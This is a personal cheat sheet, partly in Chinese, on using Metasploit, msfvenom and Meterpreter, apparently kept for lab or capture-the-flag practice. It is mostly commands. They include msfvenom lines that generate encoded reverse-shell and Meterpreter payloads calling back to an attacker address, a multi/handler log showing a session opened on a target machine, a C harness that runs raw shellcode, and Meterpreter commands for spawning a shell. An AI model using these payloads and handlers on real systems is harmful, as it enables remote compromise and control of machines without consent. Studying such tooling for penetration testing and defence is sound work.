# Metasploit
[TOC]
###### tags: `Security` `Tools`

# Reference
[Using exploits](https://www.offensive-security.com/metasploit-unleashed/using-exploits/)

# Msfconsole
```
msf> search snmp
msf> use exploit/.../.../...
msf> info
msf> show options
msf> set RHOST 192.168...
msf> set LHOST 192.168...
msf> set LPORT ...
msf> set PAYLOAD windows/...
msf> exploit
```
 + set global parameter
`msf> setg RHOSTS 192.168...`

 + database services
```
msf> hosts
msf> db_nmap 192.168.31.200-254 --top-ports 20
msf> services -p 443 # print all machine open 443 port
```

## modules
 * #### Auxiliary
```
msf > show auxiliary
```
 * #### Exploits
 
# MSFVenom
## cheatsheet
```
msfvenom --list payloads | grep linux | grep x64    // search payloads
msfvenom -p linux/x64/exec --list-options           // list options
// generate full interactive reverse shell
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.12 LPORT=7702 -f elf -o msf.bin 
```
## overview
```
msfvenom -p windows/shell_reverse_tcp  \
LHOST=192.168.30.5                     \
LPORT=443                              \
-f c                                   \
-a x86                                 \
--platform windows                     \
-b "\x00\x0a\x0d"                      \
-e x86/shikata_ga_nai                  \
EXITFUNC=thread
```
注意這個生成的 `shellcode` 會需要用到 `stack` 自我解壓縮 ，如果 `shellcode` 放在 `stack` 中(`ESP`指向位置)，要記得在最前頭塞 `nop`

### EXITFUNC
 * thread: This method is used in most exploitation scenarios where the exploited process (e.g. IE) runs the shellcode in a sub-thread and exiting this thread results in a working application/system (clean exit)
 * process: This method should be used with **multi/handler**. This method should also be used with any exploit where a master process restarts it on exit.
 * seh: This method should be used when there is a structured exception handler (SEH) that will restart the thread or process automatically when an error occurs.
 
[shellcode note](https://hackmd.io/@WildfootW/Cybersecurity/%2F%40WildfootW%2FS1DpqYLYW)
[msfvenom command cheat sheet](https://netsec.ws/?p=331)

## Useful Payload
* `use windows/meterpreter/reverse_https`
* `use windows/meterpreter/reverse_tcp_allports`

## Payload staged/non-staged
```
msfvenom -p <payload> -f <format> LHOST= LPORT= -e <encoder> -b <bad-chars>
# -e x86\shikata_ga_nai
msfvenom –list payload
```
* staged payload `Metasploit exploit/multi/handler` `windows/shell/reverse_tcp`
* non-staged payload `nc -nvlp [port]` `windows/shell_reverse_tcp` (sent in its entirety in one go)
```
windows/shell/reverse_tcp - Connect back to attacker, Spawn cmd shell (staged)
windows/shell_reverse_tcp - Connect back to attacker and spawn a command shell
```

### example: using staged payload
<pre><u style="text-decoration-style:single">msf6</u> &gt; use exploit/multi/handler 
<font color="#277FFF"><b>[*]</b></font> Using configured payload generic/shell_reverse_tcp
<u style="text-decoration-style:single">msf6</u> exploit(<font color="#EC0101"><b>multi/handler</b></font>) &gt; set lhost 10.10.14.12
lhost =&gt; 10.10.14.12
<u style="text-decoration-style:single">msf6</u> exploit(<font color="#EC0101"><b>multi/handler</b></font>) &gt; set lport 7702
lport =&gt; 7702
<u style="text-decoration-style:single">msf6</u> exploit(<font color="#EC0101"><b>multi/handler</b></font>) &gt; set payload linux/x64/meterpreter/reverse_tcp 
payload =&gt; linux/x64/meterpreter/reverse_tcp
<u style="text-decoration-style:single">msf6</u> exploit(<font color="#EC0101"><b>multi/handler</b></font>) &gt; run
</pre>

```
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.12 LPORT=7702 -f elf -o msf.bin
// generate upload & execute
```

<pre><font color="#277FFF"><b>[*]</b></font> Started reverse TCP handler on 10.10.14.12:7702 
<font color="#277FFF"><b>[*]</b></font> Sending stage (3008420 bytes) to 10.10.10.61
<font color="#277FFF"><b>[*]</b></font> Meterpreter session 1 opened (10.10.14.12:7702 -&gt; 10.10.10.61:46986) at 2020-11-14 21:02:55 +0800

<u style="text-decoration-style:single">meterpreter</u> &gt; ls
</pre>

## test payload
format 選 `-f c`
```
#include <stdio.h>

unsigned char buf[] = ""

int main()
{
    void (*f)() = (void (*)()) buf;
    f();
    return 0;
}
```
編譯
```
gcc -m32 -z execstack
```


# Meterpreter
## Online Resources
* [METERPRETER BASIC COMMANDS](https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/)
## Commands
### execute
```
meterpreter > execute -f bash -i
-f <opt>  The executable command to run.
-i        Interact with the process after creating it.
-a <opt>  The arguments to pass to the command.
-c        Channelized I/O (required for interaction).
```